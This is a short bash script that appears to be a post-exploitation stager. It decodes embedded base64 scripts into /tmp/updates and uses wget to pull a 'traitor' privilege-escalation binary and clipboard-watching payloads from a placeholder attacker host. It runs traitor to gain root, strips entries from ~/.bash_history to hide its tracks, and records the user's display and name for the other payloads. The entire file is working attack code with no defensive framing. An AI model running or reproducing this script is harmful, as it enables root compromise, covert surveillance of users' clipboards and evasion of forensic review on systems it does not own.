#!/bin/bash
dir1=/tmp/updates
cd $dir1

runroot={RUNROOT_BASE64}
echo $runroot | base64 -d | cat > ./runroot.sh
py={PY_BASE64}
echo $py | base64 -d | cat > ./rootEXEC.py

wget http://<REPLACE_IP>:10000/payloads/traitor-386 -O ./traitor

# remove evidence of history obfuscation from bash history
sed -i '/HISTCONTROL=ignorespace/d' ~/.bash_history

# Payloads
wget http://<REPLACE_IP>:10000/payloads/analyser.py -O ./analyser.py
wget http://<REPLACE_IP>:10000/payloads/clipboardWatch.py -O ./clipboardWatch.py
wget http://<REPLACE_IP>:10000/payloads/deploy_clipboard.sh -O ./deploy_clipboard.sh

chmod +x traitor
./traitor > traitor_out.txt
# cat traitor_out.txt | grep -oE '\-\-exploit \w+(:)\w+' > GTFO.txt 
chmod +x ./runroot.sh

# store DISPLAY into file - to be reused by other payloads
echo $DISPLAY > ./display.txt
# echo current user into file - to be reused by other payloads
echo $USER > ./user.txt

# Use traitor in py
python rootEXEC.py
